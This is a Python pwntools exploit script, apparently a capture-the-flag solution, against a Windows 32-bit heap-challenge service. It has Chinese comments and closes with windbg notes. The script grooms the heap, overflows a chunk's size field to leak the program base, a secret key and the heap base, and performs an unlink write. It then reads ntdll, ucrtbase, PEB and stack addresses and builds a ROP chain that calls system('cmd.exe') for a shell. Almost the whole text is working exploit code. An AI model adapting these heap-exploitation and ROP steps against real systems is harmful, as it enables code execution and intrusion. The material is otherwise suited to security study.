from pwn import *
context.arch='i386'
context.log_level='debug'
p=remote('192.168.65.1',1234)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
def bp():
    raw_input()
#-----------------------------------------------------------------------------------------
def alloc(sz,con='aa'):
    sla('Command:',1)
    sla(':',sz)
    sla(':',con)
def free(idx):
    sla(':',2)
    sla(':',idx)
def edit(idx,con):
    sla(':',3)
    sla(':',idx)
    sla(':',con)
def show_w(idx,idx2):
    sla(':',5)
    sla('show? [0/1]\r\n',idx)
    sla('show:',idx2)
def show_g(idx):
    sla(':',4)
    sla(':',idx)
def encouragement0():
    sla(':',4)
    sla(']',0)
def encouragement1():
    sla(':',4)
    sla(']',1)
def back_w():
    sla(':',6)
def back_g():
    sla(':',5)
def warm():
    sla(':',1)
def games(se):
    sla(':',2)
    sla('Secret:',se)

warm()
#堆喷射，占位，为了后面的堆布局作准备
for i in range(7):
    encouragement0()
for i in range(3):
    encouragement1()

#将encouragement0和1分配到一个堆块的后面，方便做溢出
alloc(0x200,'a'*0x200)
encouragement1()
encouragement0()

#溢出encouragement1,修改它的size位，进而造成越界读
edit(0,'a'*0x207)
edit(0,'a'*0x208+'\xff\xff')

#越界读一次只能读两位，泄露出key和程序基地址
show_w(1,131)
program_base=uu32(ru('\x0d\x0a'))<<(8*2)
leak("program_base",program_base)

key=0
show_w(1,132)
key=ru('\x0d\x0a')
show_w(1,133)
key+=ru('\x0d\x0a')
key=uu32(key)
leak("key",key)


back_w()
games(p32(key))

#进行unlink，重要的是这里的堆布局，要注意unlink的时候被unlink的堆块不能是freelist的第一个堆块，要不会报错，所以在103行先释放1再释放4，这样freelist就是第4个堆块
alloc(0x100,'aa')
free(0)

edit(0,'aa')
show_g(0)
ru('Note:')
heap_base=u32('\x00\x00'+r(4)[2:])
leak("heap_base",heap_base)
edit(0,'\xc0\x00')

chunk_ptr=program_base+0x64e0
alloc(0x60)#1
alloc(0x60)#2
alloc(0x60)#3
alloc(0x60)#4
alloc(0x60)#5
#remember not to put the target chunk
free(1)
free(4)
edit(1,p32(chunk_ptr-4)+p32(chunk_ptr))
#input()
#unlink here
free(2)

'''
unlink之后就是常规操作：
1.利用iat表泄露ntdll基地址、ucrtbase基地址
2.利用前面泄露出来的ntdll基地址计算pebldr地址（dd ntdll!PebLdr），进而泄露peb地址（在pebldr上面的固定偏移处）
3.利用peb地址，计算得出teb的地址，进而得出栈上SEH链表第一个SEH结构体的地址，它和函数的返回地址偏移固定，进而计算出函数的返回地址
4.作rop，注意x86的参数在栈上，x64的参数需要rop gadget来进行设置，system函数在ucrtbase里，cmd.exe也在ucrtbase里
'''
# remove limitation of the edit funtion, ntdll, ucrtbase
edit(1,flat([chunk_ptr,0x100,program_base+0x6018,0x100,program_base+0x4034,0x100,program_base+0x40bc]))

edit(2,p32(0x20)+p32(0x20)+p32(0x20))

show_g(3)
ru('Note:')
ntdll_base=u32(r(4))-0x77378760+0x77310000
leak('ntdll_base',ntdll_base)
show_g(4)
ru('Note:')
ucrt_base=u32(r(4))-0x7680e540+0x767e0000
leak('ucrt_base',ucrt_base)

#                                         #pebldr
edit(1,flat([chunk_ptr,0x100,ntdll_base+0x7742dc3c-0x77310000]))
show_g(2)
ru('Note:')
peb_addr=uu32(ru('\r\n'))-0x154
leak('peb_addr',peb_addr)


edit(1,flat([chunk_ptr,0x100,peb_addr+0x3000]))
show_g(2)
ru('Note:')
stack_addr=uu32(ru('\r\n'))
leak('stack_addr',stack_addr)

rop_addr=stack_addr+0x128
leak('rop_addr',rop_addr)

pop_rcx_ret=ntdll_base+0x4b29d581-0x4B280000
system_addr=ucrt_base+0xec090
edit(1,flat([chunk_ptr,0x100,rop_addr]))
edit(2,flat([system_addr,0,rop_addr+0xc])+'cmd.exe')

#触发rop
back_g()
it()

'''
windbg小结:
断点类:
bl:列出断点
bp:下断点
bd:禁止断点
be：开启断点

运行类:
g:继续运行
p:单步步过
t:单步步入
crtl+break：强行中断

dd dq dw db ：查看
ed eq ew eb : 修改
s -d[q,w,b] [开始] L[长度] [搜索内容]

lm：查看引用模块
!teb
!peb
dd ntdll!PebLdr

!heap -a [堆地址]
dt !_HEAP [堆地址]

堆的free_list结构直接能看到所有的free chunk以及大小，大小从小到大排列，先入后出
'''


'''
思路来自 haivk@polaris
参考：
http://blog.eonew.cn/archives/1216#i-2
感谢ex@polaris
'''
